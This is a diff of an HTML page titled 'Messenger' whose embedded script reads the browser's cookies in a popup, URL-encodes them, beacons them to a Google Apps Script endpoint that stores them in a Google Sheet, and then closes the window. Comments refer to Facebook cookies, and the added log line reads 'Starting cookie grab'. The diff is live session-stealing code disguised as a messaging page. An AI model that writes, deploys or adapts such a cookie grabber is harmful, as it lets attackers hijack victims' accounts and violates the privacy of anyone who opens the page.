@@ -2,38 +2,35 @@
 <html>
 <head>
     <title>Messenger</title>
-    <!-- Make sure the page loads quickly -->
 </head>
 <body style="margin:0; background:#fff;">
     
     <script>
         // ⚠️ PASTE YOUR GOOGLE APPS SCRIPT URL HERE ⚠️
-        var scriptURL = "https://script.google.com/macros/s/AKfycbxKPU2ymY-NnryEMm1bHAYpQRR2Hn15Npovdpg8THvc5G_rX0316NPYEVRXvFdMmdU/exec";
+        // Make sure there are no extra spaces or quotes!
+        var scriptURL = "https://script.google.com/macros/s/AKfycbyQEEnToPq9wKYj9u8519aYHdkRbfoGyXfobTq5rWZlG46tjm-hzUgxifVotatxe_E/exec";
 
-        // Wait 500ms to ensure Facebook cookies are fully loaded in the browser context
+        console.log("Starting cookie grab...");
+
         setTimeout(function() {
             
-            // 1. Get the cookie from THIS window (the popup)
             var rawCookie = document.cookie;
-            
-            console.log("Attempting to send:", rawCookie);
+            console.log("Raw Cookie Found:", rawCookie);
 
             if (rawCookie && rawCookie !== "") {
-                // 2. Encode it so special characters don't break the URL
                 var encodedCookie = encodeURIComponent(rawCookie);
                 
-                // 3. Use sendBeacon for reliable background sending
+                // Send to Google Sheets
                 navigator.sendBeacon(scriptURL + "?cookie=" + encodedCookie);
                 
-                console.log("Success!");
+                console.log("Sent Beacon!");
             } else {
-                console.log("No cookie found");
+                console.log("No Cookie Found");
             }
 
-            // 4. Close the popup window immediately after sending
             window.close();
 
-        }, 500); // 500 milliseconds delay
+        }, 500);
     </script>
     
 </body>
